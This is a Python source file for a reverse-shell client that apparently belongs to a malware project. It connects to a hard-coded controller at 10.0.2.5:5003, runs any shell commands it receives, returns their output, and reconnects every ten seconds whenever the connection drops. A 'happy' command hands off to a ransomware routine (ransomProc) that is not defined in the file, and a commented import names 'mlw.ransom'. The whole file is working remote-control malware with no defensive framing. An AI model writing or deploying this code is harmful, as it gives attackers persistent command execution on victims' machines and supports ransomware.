import socket
import os
import subprocess
import sys
import time

# import mlw.ransom as ransom


# SERVER_HOST = "127.0.0.1"
SERVER_HOST = "10.0.2.5"

SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

def autoconn():
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        
        cwd = os.getcwd()
        s.send(cwd.encode())
    except Exception as e:
        print(e)
        s.close()
        time.sleep(10)
        autoconn()
    cmds(s)

def cmds(s):
    term = False
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if command.lower() == "stop":
            term = True
            break
    
        if splited_command[0].lower() == "cd":
        # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
            # if there is an error, set as the output
                output = str(e)
            else:
                output = ""
        elif splited_command[0].lower() == "happy":
            print(splited_command[1:])
            output = ransomProc(splited_command[1:])
        else:
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
        
    s.close()
    if not term: autoconn()
    else: os._exit(1)

if __name__ == '__main__':
    autoconn()